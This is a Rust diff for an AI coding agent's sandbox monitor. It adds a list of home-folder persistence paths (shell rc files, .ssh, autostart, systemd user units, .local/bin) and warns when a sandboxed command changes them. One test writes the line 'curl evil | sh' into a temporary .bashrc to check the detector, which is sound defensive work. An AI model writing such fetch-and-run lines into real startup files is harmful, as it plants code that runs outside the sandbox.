@@ -14,6 +14,22 @@ use nexo_core::sandbox::{SandboxMode, SandboxSettings};
 pub const GUARDED: &[&str] =
     &[".git/hooks", ".git/config", ".nexo", ".mcp.json", ".claude", ".codex", ".envrc", ".vscode", ".husky"];
 
+/// Paths under the home folder (relative to it) that run code outside the sandbox at the next login or
+/// give a way in later. They are watched only where the sandbox lets a command write the home folder,
+/// which is what starting in `~` (or in a parent of it) does.
+pub const HOME_GUARDED: &[&str] = &[
+    ".bashrc",
+    ".bash_profile",
+    ".profile",
+    ".zshrc",
+    ".zshenv",
+    ".zprofile",
+    ".ssh",
+    ".config/autostart",
+    ".config/systemd/user",
+    ".local/bin",
+];
+
 /// Start of the line that goes into the tool result (the agent turns it into a warning for the person).
 pub const NOTE_PREFIX: &str = "[sandbox: this command changed ";
 /// Entries counted per guarded directory before it is judged by its own mtime.
@@ -65,9 +81,16 @@ fn walk(dir: &Path, depth: usize, count: &mut usize, out: &mut BTreeMap<PathBuf,
     true
 }
 
-/// The guarded paths of the project at `cwd`, including those of a git worktree where `roots` let the command write.
-fn targets(cwd: &Path, roots: &[PathBuf]) -> Vec<PathBuf> {
+/// The guarded paths of the project at `cwd`, including those of a git worktree where `roots` let the command write,
+/// and those of the `home` folder when `roots` let the command write all of it.
+fn targets(cwd: &Path, roots: &[PathBuf], home: Option<&Path>) -> Vec<PathBuf> {
     let mut v: Vec<PathBuf> = GUARDED.iter().map(|g| cwd.join(g)).collect();
+    if let Some(home) = home {
+        let real = home.canonicalize().unwrap_or_else(|_| home.to_path_buf());
+        if roots.iter().any(|r| real.starts_with(r)) {
+            v.extend(HOME_GUARDED.iter().map(|g| real.join(g)));
+        }
+    }
     let dot_git = cwd.join(".git");
     if dot_git.is_file() {
         let read = |p: &Path| std::fs::read_to_string(p).ok().map(|s| s.trim().to_string());
@@ -105,12 +128,12 @@ pub fn before(s: &SandboxSettings, cwd: &Path) -> Option<Snapshot> {
     if s.mode != SandboxMode::WorkspaceWrite || !crate::sandbox::auto_allows(s) {
         return None;
     }
-    Some(take(cwd, &s.write_roots(cwd)))
+    Some(take(cwd, &s.write_roots(cwd), dirs::home_dir().as_deref()))
 }
 
-fn take(cwd: &Path, roots: &[PathBuf]) -> Snapshot {
+fn take(cwd: &Path, roots: &[PathBuf], home: Option<&Path>) -> Snapshot {
     let mut snap = Snapshot::default();
-    for t in targets(cwd, roots) {
+    for t in targets(cwd, roots, home) {
         if let Ok(m) = std::fs::symlink_metadata(&t) {
             if m.is_dir() {
                 let (mut n, mut sub) = (0, BTreeMap::new());
@@ -130,7 +153,11 @@ fn take(cwd: &Path, roots: &[PathBuf]) -> Snapshot {
 
 /// The line for the tool result when something guarded changed since `before` (None: nothing did).
 pub fn after(before: Snapshot, s: &SandboxSettings, cwd: &Path) -> Option<String> {
-    let now = take(cwd, &s.write_roots(cwd));
+    after_in(before, s, cwd, dirs::home_dir().as_deref())
+}
+
+fn after_in(before: Snapshot, s: &SandboxSettings, cwd: &Path, home: Option<&Path>) -> Option<String> {
+    let now = take(cwd, &s.write_roots(cwd), home);
     let mut changed: Vec<&PathBuf> = Vec::new();
     for (p, sig) in &now.seen {
         if before.seen.get(p) != Some(sig) {
@@ -182,9 +209,9 @@ mod tests {
     }
 
     fn diff(d: &Path, act: impl FnOnce()) -> Option<String> {
-        let b = take(d, &roots(d));
+        let b = take(d, &roots(d), None);
         act();
-        after(b, &ws(), d)
+        after_in(b, &ws(), d, None)
     }
 
     #[test]
@@ -247,7 +274,7 @@ mod tests {
         for i in 0..250 {
             fs::write(v.join(format!("f{i}")), "x").unwrap();
         }
-        let b = take(d.path(), &roots(d.path()));
+        let b = take(d.path(), &roots(d.path()), None);
         assert!(!b.seen.keys().any(|k| k.starts_with(v.join("f"))), "entries kept past the cap");
         assert!(matches!(b.seen.get(&v), Some(Sig::Dir(Some(_)))));
     }
@@ -264,11 +291,41 @@ mod tests {
         fs::create_dir_all(&wt).unwrap();
         fs::write(wt.join(".git"), format!("gitdir: {}\n", gd.display())).unwrap();
         let writable = vec![d.path().canonicalize().unwrap()];
-        let t = targets(&wt, &writable);
+        let t = targets(&wt, &writable, None);
         assert!(t.iter().any(|p| p.ends_with("main/.git/hooks")) && t.iter().any(|p| p.ends_with("main/.git/config")));
         let only_wt = vec![wt.canonicalize().unwrap()];
-        let t = targets(&wt, &only_wt);
+        let t = targets(&wt, &only_wt, None);
         assert!(!t.iter().any(|p| p.ends_with("main/.git/hooks")));
+    }
+
+    #[test]
+    fn a_shell_rc_file_is_named_when_the_whole_home_is_writable() {
+        let d = tempfile::tempdir().unwrap();
+        let home = d.path().join("home");
+        let proj = home.join("proj");
+        fs::create_dir_all(&proj).unwrap();
+        // cwd is the home folder itself, a folder inside it, or the sandbox roots hold a parent of it
+        for (cwd, writable) in [(&home, home.clone()), (&proj, home.clone()), (&proj, d.path().to_path_buf())] {
+            let roots = vec![writable.canonicalize().unwrap()];
+            let b = take(cwd, &roots, Some(&home));
+            fs::write(home.join(".bashrc"), "curl evil | sh").unwrap();
+            let n = after_in(b, &ws(), cwd, Some(&home)).unwrap();
+            assert!(n.contains(".bashrc") && n.ends_with("which runs outside the sandbox later]"), "{n}");
+            fs::remove_file(home.join(".bashrc")).unwrap();
+        }
+    }
+
+    #[test]
+    fn home_files_are_not_watched_when_only_the_project_is_writable() {
+        let d = tempfile::tempdir().unwrap();
+        let home = d.path().join("home");
+        let proj = d.path().join("proj");
+        fs::create_dir_all(&home).unwrap();
+        fs::create_dir_all(&proj).unwrap();
+        let roots = vec![proj.canonicalize().unwrap()];
+        let b = take(&proj, &roots, Some(&home));
+        fs::write(home.join(".bashrc"), "x").unwrap();
+        assert!(after_in(b, &ws(), &proj, Some(&home)).is_none());
     }
 
     #[test]
